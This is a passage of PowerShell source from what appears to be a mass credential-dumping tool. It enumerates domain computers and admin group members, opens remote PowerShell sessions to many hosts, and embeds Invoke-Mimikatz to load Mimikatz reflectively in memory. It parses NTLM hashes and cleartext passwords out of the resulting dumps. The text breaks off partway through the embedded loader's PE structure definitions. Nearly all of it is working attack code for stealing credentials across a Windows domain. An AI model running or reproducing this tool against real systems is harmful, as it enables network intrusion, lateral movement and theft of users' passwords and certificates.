                    HelpMessage="Domain controller for Domain and Site that you want to query against.")]
                    [string]$DomainController,

                    [Parameter(Mandatory=$false,
                    HelpMessage="Limit results by the provided operating system. Default is all.")]
                    [string]$OsFilter = "*",

                    [Parameter(Mandatory=$false,
                    HelpMessage="Limit results by only include servers with registered winrm services.")]
                    [switch]$WinRM,

                    [Parameter(Mandatory=$false,
                    HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
                    [int]$Limit = 1000,

                    [Parameter(Mandatory=$false,
                    HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
                    [ValidateSet("Subtree","OneLevel","Base")]
                    [string]$SearchScope = "Subtree",

                    [Parameter(Mandatory=$false,
                    HelpMessage="Distinguished Name Path to limit search to.")]

                    [string]$SearchDN
                )

                Write-verbose "Getting list of Servers from DC..."

                # Get domain computers from dc 
                if ($OsFilter -eq "*"){
                    $OsCompFilter = "(operatingsystem=*)"
                }else{
                    $OsCompFilter = "(operatingsystem=*$OsFilter*)"
                }

                # Select winrm spns if flagged
                if($WinRM){
                    $winrmComFilter = "(servicePrincipalName=*WSMAN*)"
                }else{
                    $winrmComFilter = ""
                }

                $CompFilter = "(&(objectCategory=Computer)$winrmComFilter $OsCompFilter)"        
                $ObjSearcher.PageSize = $Limit
                $ObjSearcher.Filter = $CompFilter
                $ObjSearcher.SearchScope = "Subtree"

                if ($SearchDN)
                {
                    $objSearcher.SearchDN = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($SearchDN)")         
                }

                $ObjSearcher.FindAll() | ForEach-Object {
            
                    #add server to data table
                    $ComputerName = [string]$_.properties.dnshostname                    
                    $TblServers.Rows.Add($ComputerName) | Out-Null 
                }
            }

            # ----------------------------------------
            # Function to check group membership 
            # ----------------------------------------        
            function Get-GroupMember
            {
                [CmdletBinding()]
                Param(
                    [Parameter(Mandatory=$false,
                    HelpMessage="Credentials to use when connecting to a Domain Controller.")]
                    [System.Management.Automation.PSCredential]
                    [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
                    [Parameter(Mandatory=$false,
                    HelpMessage="Domain controller for Domain and Site that you want to query against.")]
                    [string]$DomainController,

                    [Parameter(Mandatory=$false,
                    HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
                    [string]$Group = "Domain Admins",

                    [Parameter(Mandatory=$false,
                    HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
                    [int]$Limit = 1000,

                    [Parameter(Mandatory=$false,
                    HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
                    [ValidateSet("Subtree","OneLevel","Base")]
                    [string]$SearchScope = "Subtree",

                    [Parameter(Mandatory=$false,
                    HelpMessage="Distinguished Name Path to limit search to.")]
                    [string]$SearchDN
                )
  
                if ($DomainController -and $Credential.GetNetworkCredential().Password)
                   {
                        $root = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                        $rootdn = $root | select distinguishedName -ExpandProperty distinguishedName
                        $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/CN=$Group, CN=Users,$rootdn" , $Credential.UserName,$Credential.GetNetworkCredential().Password
                        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
                    }
                    else
                    {
                        $root = ([ADSI]"").distinguishedName
                        $objDomain = [ADSI]("LDAP://CN=$Group, CN=Users," + $root)  
                        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
                    }
        
                    # Create data table to house results to return
                    $TblMembers = New-Object System.Data.DataTable 
                    $TblMembers.Columns.Add("GroupMember") | Out-Null 
                    $TblMembers.Clear()

                    $objDomain.member | %{                    
                        $TblMembers.Rows.Add($_.split("=")[1].split(",")[0]) | Out-Null 
                }

                return $TblMembers
            }

            # ----------------------------------------
            # Mimikatz parse function (Will Schoeder's) 
            # ----------------------------------------

            # This is a *very slightly mod version of will schroeder's function from:
            # https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1
            function Parse-Mimikatz {

                [CmdletBinding()]
                param(
                    [string]$raw
                )
    
                # Create data table to house results
                $TblPasswords = New-Object System.Data.DataTable 
                $TblPasswords.Columns.Add("PwType") | Out-Null
                $TblPasswords.Columns.Add("Domain") | Out-Null
                $TblPasswords.Columns.Add("Username") | Out-Null
                $TblPasswords.Columns.Add("Password") | Out-Null    

                # msv
	            $results = $raw | Select-String -Pattern "(?s)(?<=msv :).*?(?=tspkg :)" -AllMatches | %{$_.matches} | %{$_.value}
                if($results){
                    foreach($match in $results){
                        if($match.Contains("Domain")){
                            $lines = $match.split("`n")
                            foreach($line in $lines){
                                if ($line.Contains("Username")){
                                    $username = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Domain")){
                                    $domain = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("NTLM")){
                                    $password = $line.split(":")[1].trim()
                                }
                            }
                            if ($password -and $($password -ne "(null)")){
                                #$username+"/"+$domain+":"+$password
                                $Pwtype = "msv"
                                $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password) | Out-Null 
                            }
                        }
                    }
                }
                $results = $raw | Select-String -Pattern "(?s)(?<=tspkg :).*?(?=wdigest :)" -AllMatches | %{$_.matches} | %{$_.value}
                if($results){
                    foreach($match in $results){
                        if($match.Contains("Domain")){
                            $lines = $match.split("`n")
                            foreach($line in $lines){
                                if ($line.Contains("Username")){
                                    $username = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Domain")){
                                    $domain = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Password")){
                                    $password = $line.split(":")[1].trim()
                                }
                            }
                            if ($password -and $($password -ne "(null)")){
                                #$username+"/"+$domain+":"+$password
                                $Pwtype = "wdigest/tspkg"
                                $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password) | Out-Null
                            }
                        }
                    }
                }
                $results = $raw | Select-String -Pattern "(?s)(?<=wdigest :).*?(?=kerberos :)" -AllMatches | %{$_.matches} | %{$_.value}
                if($results){
                    foreach($match in $results){
                        if($match.Contains("Domain")){
                            $lines = $match.split("`n")
                            foreach($line in $lines){
                                if ($line.Contains("Username")){
                                    $username = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Domain")){
                                    $domain = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Password")){
                                    $password = $line.split(":")[1].trim()
                                }
                            }
                            if ($password -and $($password -ne "(null)")){
                                #$username+"/"+$domain+":"+$password
                                $Pwtype = "wdigest/kerberos"
                                $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password) | Out-Null
                            }
                        }
                    }
                }
                $results = $raw | Select-String -Pattern "(?s)(?<=kerberos :).*?(?=ssp :)" -AllMatches | %{$_.matches} | %{$_.value}
                if($results){
                    foreach($match in $results){
                        if($match.Contains("Domain")){
                            $lines = $match.split("`n")
                            foreach($line in $lines){
                                if ($line.Contains("Username")){
                                    $username = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Domain")){
                                    $domain = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Password")){
                                    $password = $line.split(":")[1].trim()
                                }
                            }
                            if ($password -and $($password -ne "(null)")){
                                #$username+"/"+$domain+":"+$password
                                $Pwtype = "kerberos/ssp"
                                $TblPasswords.Rows.Add($PWtype,$domain,$username,$password) | Out-Null
                            }
                        }
                    }
                }

                # Remove the computer accounts
                $TblPasswords_Clean = $TblPasswords | Where-Object { $_.username -notlike "*$"}

                return $TblPasswords_Clean
            }
        }

        # Conduct attack
        Process 
        {

            # ----------------------------------------
            # Compile list of target systems
            # ----------------------------------------

            # Get list of systems from the command line / pipeline            
            if ($Hosts)
            {
                Write-verbose "Getting list of Servers from provided hosts..."
                $Hosts | 
                %{ 
                    $TblServers.Rows.Add($_) | Out-Null 
                }
            }

            # Get list of systems from the command line / pipeline
            if($HostList){
                Write-verbose "Getting list of Servers $HostList..."                
                if (Test-Path -Path $HostList){
                    $HostListHosts += Get-Content -Path $HostList
                    $HostListHosts|
                    %{
                        $TblServers.Rows.Add($_) | Out-Null
                    }
                }else{
                    Write-Warning "[!] Input file '$HostList' doesn't exist!"
                }            
            }

            # Get list of domain systems from dc and add to the server list
            if ($AutoTarget)
            {
                if ($OsFilter){
                    $FlagOsFilter = "$OsFilter"
                }else{
                    $FlagOsFilter = "*"
                }


                if ($WinRM){
                    Get-DomainComputers -WinRM -OsFilter $OsFilter
                }else{
                    Get-DomainComputers -OsFilter $OsFilter
                }
            }


            # ----------------------------------------
            # Get list of entrprise/domain admins
            # ----------------------------------------
            if ($AutoTarget)
            {
                Write-Verbose "Getting list of Enterprise and Domain Admins..."
                if ($DomainController -and $Credential.GetNetworkCredential().Password)            
                {           
                    $EnterpriseAdmins = Get-GroupMember -Group "Enterprise Admins" -DomainController $DomainController -Credential $Credential
                    $DomainAdmins = Get-GroupMember -Group "Domain Admins" -DomainController $DomainController -Credential $Credential
                }else{

                    $EnterpriseAdmins = Get-GroupMember -Group "Enterprise Admins"
                    $DomainAdmins = Get-GroupMember -Group "Domain Admins"
                }
            }


            # ----------------------------------------
            # Establish sessions
            # ---------------------------------------- 
            $ServerCount = $TblServers.Rows.Count

            if($ServerCount -eq 0){
                Write-Verbose "No target systems were provided."
                break
            }

            if($ServerCount -lt $MaxHosts){
                $MaxHosts = $ServerCount
            }

            Write-Verbose "Found $ServerCount servers that met search criteria."            
            Write-verbose "Attempting to create $MaxHosts ps sessions..."

            # Set counters
            $ServerCounter = 0     
            $SessionCount = 0   

            $TblServers | 
            ForEach-Object {
                if ($ServerCounter -le $ServerCount -and $SessionCount -lt $MaxHosts){

                    $ServerCounter = $ServerCounter+1
                
                    # attempt session
                    [string]$MyComputer = $_.ComputerName    
                    
                    New-PSSession -ComputerName $MyComputer -Credential $Credential -ErrorAction SilentlyContinue -ThrottleLimit $MaxHosts | Out-Null          
                    
                    # Get session count
                    $SessionCount = Get-PSSession | Measure-Object | select count -ExpandProperty count
                    Write-Verbose "Established Sessions: $SessionCount of $MaxHosts - Processed server $ServerCounter of $ServerCount - $MyComputer"         
                }
            }  
            
                        
            # ---------------------------------------------
            # Attempt to run mimikatz against open sessions
            # ---------------------------------------------
            if($SessionCount -ge 1){

                # run the mimikatz command
                Write-verbose "Running reflected Mimikatz against $SessionCount open ps sessions..."
                $x = Get-PSSession            
                
                # original invoke-mimikatz               
$HostedScript = 
@'
function Invoke-Mimikatz
{
<#
.SYNOPSIS

This script leverages Mimikatz 2.0 and Invoke-ReflectivePEInjection to reflectively load Mimikatz completely in memory. This allows you to do things such as
dump credentials without ever writing the mimikatz binary to disk. 
The script has a ComputerName parameter which allows it to be executed against multiple computers.

This script should be able to dump credentials from any version of Windows through Windows 8.1 that has PowerShell v2 or higher installed.

Function: Invoke-Mimikatz
Author: Joe Bialek, Twitter: @JosephBialek
Mimikatz Author: Benjamin DELPY `gentilkiwi`. Blog: http://blog.gentilkiwi.com. Email: benjamin@gentilkiwi.com. Twitter @gentilkiwi
License:  http://creativecommons.org/licenses/by/3.0/fr/
Required Dependencies: Mimikatz (included)
Optional Dependencies: None
Version: 1.4
ReflectivePEInjection version: 1.1
Mimikatz version: 2.0 alpha (5/18/2014)

.DESCRIPTION

Reflectively loads Mimikatz 2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any 
functionality provided with Mimikatz.

.PARAMETER DumpCreds

Switch: Use mimikatz to dump credentials out of LSASS.

.PARAMETER DumpCerts

Switch: Use mimikatz to export all private certificates (even if they are marked non-exportable).

.PARAMETER Command

Supply mimikatz a custom command line. This works exactly the same as running the mimikatz executable like this: mimikatz "privilege::debug exit" as an example.

.PARAMETER ComputerName

Optional, an array of computernames to run the script on.
    
.EXAMPLE

Execute mimikatz on the local computer to dump certificates.
Invoke-Mimikatz -DumpCerts

.EXAMPLE

Execute mimikatz on two remote computers to dump credentials.
Invoke-Mimikatz -DumpCreds -ComputerName @("computer1", "computer2")

.EXAMPLE

Execute mimikatz on a remote computer with the custom command "privilege::debug exit" which simply requests debug privilege and exits
Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"

.NOTES
This script was created by combining the Invoke-ReflectivePEInjection script written by Joe Bialek and the Mimikatz code written by Benjamin DELPY
Find Invoke-ReflectivePEInjection at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection
Find mimikatz at: http://blog.gentilkiwi.com

.LINK

Blog: http://clymb3r.wordpress.com/
Benjamin DELPY blog: http://blog.gentilkiwi.com

Github repo: https://github.com/clymb3r/PowerShell
mimikatz Github repo: https://github.com/gentilkiwi/mimikatz

Blog on reflective loading: http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/
Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/

#>

[CmdletBinding(DefaultParameterSetName="DumpCreds")]
Param(
    [Parameter(Position = 0)]
    [String[]]
    $ComputerName,

    [Parameter(ParameterSetName = "DumpCreds", Position = 1)]
    [Switch]
    $DumpCreds,

    [Parameter(ParameterSetName = "DumpCerts", Position = 1)]
    [Switch]
    $DumpCerts,

    [Parameter(ParameterSetName = "CustomCommand", Position = 1)]
    [String]
    $Command
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $PEBytes64,

        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $PEBytes32,
        
        [Parameter(Position = 2, Mandatory = $false)]
        [String]
        $FuncReturnType,
                
        [Parameter(Position = 3, Mandatory = $false)]
        [Int32]
        $ProcId,
        
        [Parameter(Position = 4, Mandatory = $false)]
        [String]
        $ProcName,

        [Parameter(Position = 5, Mandatory = $false)]
        [String]
        $ExeArgs
    )
    
    ###################################
    ##########  Win32 Stuff  ##########
    ###################################
    Function Get-Win32Types
    {
        $Win32Types = New-Object System.Object

        #Define all the structures/enums that will be used
        #   This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
        $Domain = [AppDomain]::CurrentDomain
        $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
        $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


        ############    ENUM    ############
        #Enum MachineType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
        $TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
        $MachineType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

        #Enum MagicType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
        $MagicType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

        #Enum SubSystemType
        $TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
        $SubSystemType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

        #Enum DllCharacteristicsType
        $TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
        $TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
        $TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
        $TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
        $TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
        $DllCharacteristicsType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

        ###########    STRUCT    ###########
        #Struct IMAGE_DATA_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
        ($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
        $IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

        #Struct IMAGE_FILE_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
        $IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

        #Struct IMAGE_OPTIONAL_HEADER64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
        $IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

        #Struct IMAGE_OPTIONAL_HEADER32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
